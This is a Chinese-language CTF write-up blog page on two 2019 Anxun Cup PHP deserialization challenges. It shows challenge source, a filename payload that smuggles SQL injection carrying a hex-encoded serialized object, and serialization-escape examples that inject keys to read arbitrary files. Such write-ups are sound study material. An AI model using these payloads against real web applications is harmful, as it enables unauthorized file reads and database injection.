@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言偶然看到2019安洵杯Web部分的两道题，看了writpup感觉思路很有启发性，是我平时不会去注意的地方。现在这两道题在buuctf上有现成的环境可以做。 这真的不是文件上传网站功能是上传图片，但是不会保存图片内容，只保存文件名称并有回显。在index.html最下方有提示，可以在github上下载源码进行审计。 在helper.php中存在读取文件内容函数，并且可以使用destruct函数自">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于反序列化的两道CTF">
+<meta property="og:url" content="http://ama666.cn/2020/05/28/关于反序列化的两道CTF/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="前言偶然看到2019安洵杯Web部分的两道题，看了writpup感觉思路很有启发性，是我平时不会去注意的地方。现在这两道题在buuctf上有现成的环境可以做。 这真的不是文件上传网站功能是上传图片，但是不会保存图片内容，只保存文件名称并有回显。在index.html最下方有提示，可以在github上下载源码进行审计。 在helper.php中存在读取文件内容函数，并且可以使用destruct函数自">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200529185551.png">
+<meta property="og:updated_time" content="2020-05-30T07:07:15.803Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于反序列化的两道CTF">
+<meta name="twitter:description" content="前言偶然看到2019安洵杯Web部分的两道题，看了writpup感觉思路很有启发性，是我平时不会去注意的地方。现在这两道题在buuctf上有现成的环境可以做。 这真的不是文件上传网站功能是上传图片，但是不会保存图片内容，只保存文件名称并有回显。在index.html最下方有提示，可以在github上下载源码进行审计。 在helper.php中存在读取文件内容函数，并且可以使用destruct函数自">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200529185551.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2020/05/28/关于反序列化的两道CTF/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>关于反序列化的两道CTF | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/05/28/关于反序列化的两道CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">关于反序列化的两道CTF
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-29 12:08:44" itemprop="dateCreated datePublished" datetime="2020-05-29T12:08:44+08:00">2020-05-29</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-05-30 15:07:15" itemprop="dateModified" datetime="2020-05-30T15:07:15+08:00">2020-05-30</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>偶然看到2019安洵杯Web部分的两道题，看了writpup感觉思路很有启发性，是我平时不会去注意的地方。现在这两道题在<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuctf</a>上有现成的环境可以做。</p>
+<h2 id="这真的不是文件上传"><a href="#这真的不是文件上传" class="headerlink" title="这真的不是文件上传"></a>这真的不是文件上传</h2><p>网站功能是上传图片，但是不会保存图片内容，只保存文件名称并有回显。在index.html最下方有提示，可以在github上下载源码进行审计。</p>
+<p>在helper.php中存在读取文件内容函数，并且可以使用destruct函数自动触发。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果可以构造如下的类并将序列化字符串传入，就可以读取到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  	<span class="keyword">$this</span>-&gt;config = <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在show.php中存在反序列化函数，跟随变量<code>attr_temp</code>，看到此变量来源于数据库中<code>attr</code>列。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">					$attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在helper.php中的<code>upload</code>函数中我们得知数据库一共有<code>title</code>，<code>filename</code>，<code>ext</code>，<code>path</code>，<code>attr</code>五列，其中<code>attr</code>列内容来源于上传图像的长宽序列化数组，很难进行控制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br></pre></td></tr></table></figure>
+
+<p>查看helper.php中的数据库操作函数，对输入数据库的数据没有做任何过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">			$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br></pre></td></tr></table></figure>
+
+<p>回想前面的5列中，我们可控的且没有过滤的是<code>filename</code>列也就是文件名，可以构造文件名为序列化字符串，出发unserialize函数，读取任意文件。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title_value','filename_value','ext_value','path_value','O:6:"helper":2:&#123;s:9:"*ifview";b:1;s:9:"*config";s:4:"flag";&#125;#</span><br></pre></td></tr></table></figure>
+
+<p>难题是在序列化中，所有的<code>private</code>和<code>protected</code>变量序列化之后都会出现不可见字符。将序列化的内容输出，使用<code>Hex Fiend</code>打开，可以看到在星号<code>*</code>两侧是存在不可见字符<code>00</code>的。直接复制输出的话是无法传入这两个字符的。在前面数据库插入操作的时候，将00*00转换为\0\0\0了，在反序列化之前又转换了回来。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200529185551.png" alt></p>
+<p>由于上传时文件名不允许出现引号，配合数据库将0x开头的字符串默认为16进制的特点，最终payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#.jpg</span><br></pre></td></tr></table></figure>
+
+<p>将实际插入数据库的语句改写为，完成注入，反序列化读取数据库中的恶意代码，完成文件读取。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images(<span class="string">'title'</span>,<span class="string">'filename'</span>,<span class="string">'ext'</span>,<span class="string">'path'</span>,<span class="string">'attr'</span>) <span class="keyword">VALUES</span> (<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="number">0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D</span>)<span class="comment">#)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Easy-serialize-php"><a href="#Easy-serialize-php" class="headerlink" title="Easy_serialize_php"></a>Easy_serialize_php</h2><p>题目一上来就给出了源代码，初看之下是一个反序列化。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>追踪<code>serialize_info</code>变量，在代码上方找到来自<code>SESSION</code>，数组中含有这些变量</p>
+<blockquote>
+<p>user</p>
+<p>function </p>
+<p>img</p>
+</blockquote>
+<p>代码中存在变量覆盖漏洞，<code>user</code>和<code>function</code>变量是可控的。但是<code>img</code>变量是sha1函数加密，无法控制读取任意文件。</p>
+<p>追踪变量，发现<code>SESSION</code>变量在序列化之后，又经过了<code>filter</code>函数过滤了关键字。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&apos;php&apos;,&apos;flag&apos;,&apos;php5&apos;,&apos;php4&apos;,&apos;fl1g&apos;);</span><br><span class="line">    $filter = &apos;/&apos;.implode(&apos;|&apos;,$filter_arr).&apos;/i&apos;;</span><br><span class="line">    return preg_replace($filter,&apos;&apos;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>
+
+<p>这一行为可能导致序列化之后的字符串结构被破坏，使得我们可以控制一些本来无法控制的变量。其中又可以细分为键值对键名逃逸和键值逃逸。</p>
+<p>先来看键名逃逸，本质上是让键名被过滤函数吃掉，让键值的一部分充当键名，让剩下一部分的键值构成<strong>键值 键名 键值</strong>，后面一对儿键就是我们可控的地方。构造如下的数组并序列化，序列化结果如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"phpflag"</span> =&gt; <span class="string">';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=='</span>,</span><br><span class="line">    );</span><br><span class="line">$a = serialize($_SESSION);</span><br><span class="line"><span class="keyword">echo</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;phpflag&quot;;s:45:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当经过<code>filter</code>之后会变成如下这样。第一个键名会变为<code>&quot;;s:45:</code>，键值变为<code>1</code>。后面的<code>img</code>变为可控键值对。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">""</span>;s:<span class="number">45</span>:<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:3:"</span>img<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是键值逃逸，本质上就是让键值被过滤函数吃掉，让下一对键名键值充当被吃掉的键值，让剩下的一部分构成新的<strong>键名 键值</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"user"</span> =&gt; <span class="string">'flagflagflagflagflagflag'</span>,</span><br><span class="line">    <span class="string">"function"</span> =&gt; <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span>,</span><br><span class="line">    <span class="string">"img"</span> =&gt; <span class="string">'ZDBnM19mMWFnLnBocA=='</span></span><br><span class="line">    );</span><br><span class="line">$a = serialize($_SESSION);</span><br><span class="line"><span class="keyword">echo</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">"flagflagflagflagflagflag"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">42</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>当经过<code>filter</code>函数之后会变成如下这样。第一个键值会变成<code>;s:8:&quot;function&quot;;s:42:&quot;a</code>，后面的<code>img</code>键值对变为可控。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">42</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2020/05/28/关于反序列化的两道CTF/" title="关于反序列化的两道CTF">http://ama666.cn/2020/05/28/关于反序列化的两道CTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/24/Redis主从漏洞复现/" rel="next" title="Redis主从漏洞复现">
+                <i class="fa fa-chevron-left"></i> Redis主从漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/03/无列名盲注/" rel="prev" title="无列名盲注">
+                无列名盲注 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">66</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
